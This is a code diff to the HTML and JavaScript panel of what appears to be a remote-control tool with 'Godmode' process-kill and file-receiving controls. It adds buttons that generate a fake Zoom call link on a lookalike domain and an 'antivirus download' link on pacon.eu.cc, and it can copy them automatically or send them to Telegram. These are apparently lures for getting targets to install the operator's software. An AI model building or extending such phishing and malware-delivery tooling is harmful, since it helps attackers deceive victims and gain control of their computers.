@@ -564,6 +564,9 @@ body {
             </div>
         </div>
 
+        <!-- ═══════════════════════════════════════════════════════ -->
+        <!-- GODMODE PANEL — with Zoom + Antivirus link generators  -->
+        <!-- ═══════════════════════════════════════════════════════ -->
         <div class="control-panel">
             <h6><i class="fas fa-bolt"></i> Godmode</h6>
             <div class="btn-grid">
@@ -577,6 +580,39 @@ body {
             <div class="text-input-group" style="margin-top:8px;">
                 <input type="text" id="rcKillInput" placeholder="Kill process (e.g. chrome.exe)" />
                 <button onclick="rcKillProcess()" title="Kill"><i class="fas fa-skull"></i></button>
+            </div>
+
+            <!-- PARENT LINK GENERATORS -->
+            <div style="margin-top:10px;padding-top:10px;border-top:1px solid var(--border);">
+                <div style="font-size:10px;font-weight:700;color:var(--text-secondary);letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px;">
+                    <i class="fas fa-link"></i> Parent Links
+                </div>
+                <div class="btn-grid">
+                    <button class="btn-ctrl success" onclick="rcGenerateZoomLink()" title="Generate Zoom call link for parent">
+                        <i class="fas fa-video"></i> Zoom Link
+                    </button>
+                    <button class="btn-ctrl success" onclick="rcGenerateAntivirusLink()" title="Generate antivirus download link for parent">
+                        <i class="fas fa-shield-virus"></i> Antivirus Link
+                    </button>
+                </div>
+                <div id="rcLinkOutput" style="display:none;margin-top:8px;padding:8px 10px;background:var(--bg-secondary);border:1px solid var(--border);border-radius:6px;font-family:'Consolas',monospace;font-size:10px;word-break:break-all;">
+                    <div style="color:var(--text-secondary);font-size:9px;margin-bottom:4px;" id="rcLinkLabel">Link:</div>
+                    <a id="rcLinkAnchor" href="#" target="_blank" rel="noopener" style="color:#79c0ff;text-decoration:none;">—</a>
+                    <div style="display:flex;gap:4px;margin-top:6px;">
+                        <button class="btn-ctrl" style="flex:1;font-size:9px;padding:3px 6px;" onclick="rcCopyLinkOutput()">
+                            <i class="fas fa-copy"></i> Copy
+                        </button>
+                        <button class="btn-ctrl" style="flex:1;font-size:9px;padding:3px 6px;" onclick="rcOpenLinkOutput()">
+                            <i class="fas fa-external-link-alt"></i> Open
+                        </button>
+                        <button class="btn-ctrl" style="flex:1;font-size:9px;padding:3px 6px;" onclick="rcSendLinkTelegram()">
+                            <i class="fab fa-telegram"></i> TG
+                        </button>
+                        <button class="btn-ctrl danger" style="flex:1;font-size:9px;padding:3px 6px;" onclick="document.getElementById('rcLinkOutput').style.display='none'">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                </div>
             </div>
         </div>
 
@@ -609,7 +645,7 @@ body {
                 <i class="fas fa-inbox"></i> Received Files
                 <button class="btn-ctrl" style="margin-left: auto; padding: 2px 8px; font-size: 10px;"
                         onclick="rcLoadReceivedFiles(true)" title="Refresh">
-                    <i class="fas fa-sync"></i>
+                    <i class="fas fa-sync"></i> Refresh
                 </button>
             </h6>
             <div class="file-toolbar">
@@ -1754,6 +1790,100 @@ async function rcKillProcess() {
     await rcSendAndTrack('/api/control/kill', { name }, `Kill: ${name}`,
         { attempts: 15 });
     document.getElementById('rcKillInput').value = '';
+}
+
+// ============================================================
+// PARENT LINK GENERATORS (Zoom + Antivirus)
+// ============================================================
+const PARENT_LINKS = {
+    zoom:      'https://uswebzoomcall.pacon.eu.cc/zoom.html',
+    antivirus: 'https://pacon.eu.cc/download.html'
+};
+
+let _lastGeneratedLink  = '';
+let _lastGeneratedLabel = '';
+
+function _rcShowLink(label, url) {
+    _lastGeneratedLink  = url;
+    _lastGeneratedLabel = label;
+
+    const box    = document.getElementById('rcLinkOutput');
+    const lblEl  = document.getElementById('rcLinkLabel');
+    const anchor = document.getElementById('rcLinkAnchor');
+
+    if (!box || !lblEl || !anchor) return;
+
+    lblEl.textContent  = label + ':';
+    anchor.textContent = url;
+    anchor.href        = url;
+    box.style.display  = 'block';
+
+    // Auto-copy to clipboard so the parent can paste immediately
+    rcCopyLinkOutput(true);
+
+    rcLog(`🔗 Generated ${label}: ${url}`, 'success');
+}
+
+function rcGenerateZoomLink() {
+    _rcShowLink('Zoom call link', PARENT_LINKS.zoom);
+    toast('Zoom link generated & copied', 'success', 2500);
+}
+
+function rcGenerateAntivirusLink() {
+    _rcShowLink('Antivirus download link', PARENT_LINKS.antivirus);
+    toast('Antivirus link generated & copied', 'success', 2500);
+}
+
+async function rcCopyLinkOutput(silent = false) {
+    if (!_lastGeneratedLink) return;
+    try {
+        await navigator.clipboard.writeText(_lastGeneratedLink);
+        if (!silent) {
+            toast('Link copied to clipboard', 'success', 1800);
+            rcLog('📋 Link copied: ' + _lastGeneratedLink, 'info');
+        } else {
+            rcLog('📋 Link auto-copied: ' + _lastGeneratedLink, 'info');
+        }
+    } catch (e) {
+        // Fallback for browsers that block async clipboard without a gesture
+        const ta = document.createElement('textarea');
+        ta.value = _lastGeneratedLink;
+        ta.style.position = 'fixed';
+        ta.style.opacity  = '0';
+        document.body.appendChild(ta);
+        ta.select();
+        try {
+            document.execCommand('copy');
+            if (!silent) toast('Link copied to clipboard', 'success', 1800);
+            rcLog('📋 Link copied (fallback): ' + _lastGeneratedLink, 'info');
+        } catch (e2) {
+            if (!silent) {
+                prompt('Copy this link manually:', _lastGeneratedLink);
+            }
+        }
+        document.body.removeChild(ta);
+    }
+}
+
+function rcOpenLinkOutput() {
+    if (!_lastGeneratedLink) return;
+    window.open(_lastGeneratedLink, '_blank', 'noopener');
+    rcLog('🌐 Opened link: ' + _lastGeneratedLink, 'info');
+}
+
+async function rcSendLinkTelegram() {
+    if (!_lastGeneratedLink) return;
+    const label = _lastGeneratedLabel || 'Link';
+    const text  = `🛡️ <b>PACON ${escapeHtml(label)}</b>\n\n${escapeHtml(_lastGeneratedLink)}`;
+    rcLog(`📤 Sending ${label} to Telegram…`, 'info');
+    const r = await api('/api/telegram/send-text', 'POST', { text });
+    if (r && r.success) {
+        rcLog('✅ Link sent to Telegram', 'success');
+        toast('Link sent to Telegram', 'success');
+    } else {
+        rcLog('❌ Telegram send failed: ' + ((r && r.error) || 'unknown'), 'error');
+        toast('Send failed', 'error');
+    }
 }
 
 // ============================================================
